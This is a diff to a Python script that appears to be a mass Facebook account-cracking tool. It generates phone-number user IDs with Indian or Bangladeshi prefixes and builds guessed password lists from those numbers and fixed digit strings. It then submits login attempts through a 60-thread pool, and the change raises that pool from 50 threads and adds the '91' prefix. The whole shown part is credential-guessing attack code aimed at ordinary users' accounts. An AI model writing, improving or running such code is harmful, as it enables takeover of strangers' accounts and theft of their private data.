@@ -430,7 +430,7 @@ def ran():
     if ask in ["1", "01", "a", "A"]:
         print(" [b]    [red1]✗ [chartreuse1]Selected  [orange3]▶  [chartreuse1]IND Number")
         print(sort.line())
-        print("[b]     [red1]✗ [chartreuse1]Example   [orange3]▶  [chartreuse1]+91629, +91701")
+        print("[b]     [red1]✗ [chartreuse1] Without country code 10 digit EX [orange3]▶  [chartreuse1]6293799675, 7012878836")
         code = str(input("\x1b[38;1;196m\x1b[38;5;196m     ✗ \x1b[38;5;198mChoice   \x1b[38;5;208m ▶ \x1b[38;0;196m "))
         print(sort.line())
         print("[b]     [red1]✗ [chartreuse1]Example   [orange3]▶  [chartreuse1]100000, 200000")
@@ -474,18 +474,21 @@ def ran():
     else:
         fb = "mbasic"
     
-    with ThreadPool(max_workers=50) as heron:
+    with ThreadPool(max_workers=60) as heron:
         sort.clear()
         sort.logo()
         print(" [b]    [red1]✗ [chartreuse1]Total Uid [orange3]▶  [chartreuse1]" + str(len(user)))
         print(f" [b]    [red1]✗ [light_green]Method   [orange3]▶  [light_green] M" + meth)
         print(sort.line())
         for xd in user:
-            uid = "0" + xd
             if ask in ["1", "01", "a", "A"]:
-                pwx = ["57575751", "57575752", "57273200", "59039200", "07860786", uid, xd, xd[1:]]
+                uid = "91" + xd
             else:
-                pwx = [uid, uid[:6], uid[:8], xd[4], xd[2:]]# , "bangladesh", "@#@#@#", "@#@#@#@#", "@@@###", "@@@@####", "১২৩৪৫৬"]
+                uid = "0" + xd
+            if ask in ["1", "01", "a", "A"]:
+                pwx = ["57575751", "57575752", "57273200", "59039200", "07860786", uid, xd, xd[2:]]
+            else:
+                pwx = [uid, uid[:6], uid[:8], xd[4:], xd[2:]]# , "bangladesh", "@#@#@#", "@#@#@#@#", "@@@###", "@@@@####", "১২৩৪৫৬"]
             heron.submit(ren_sub, uid, pwx, meth, user, fb)
 
 
